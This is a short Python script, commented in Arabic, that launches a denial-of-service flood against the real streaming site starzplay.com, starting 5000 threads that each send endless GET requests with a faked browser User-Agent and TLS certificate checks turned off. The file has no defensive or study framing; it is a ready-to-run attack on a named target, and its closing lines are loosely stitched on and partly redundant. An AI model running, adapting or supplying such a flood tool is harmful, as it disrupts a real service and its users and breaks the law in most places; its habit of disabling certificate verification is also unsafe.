import requests
import threading
import urllib3

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target = 'https://starzplay.com/'
fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

def attack():
    while True:
        try:
            response = requests.get(target, headers=headers, verify=False)
            print("تم إرسال الطلب إلى:", target)
        except Exception as e:
            print("حدث خطأ:", e)

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()

# إضافة response = requests.get(target, headers=headers, verify=False)
response = requests.get(target, headers=headers, verify=False)
print(response.text)

# تعديل معلمة verify في كائن Session
session = requests.Session()
session.verify = False

# يمكن استخدام الدالة session.get() بدلاً من requests.get()
response = session.get(target, headers=headers)
print(response.text)
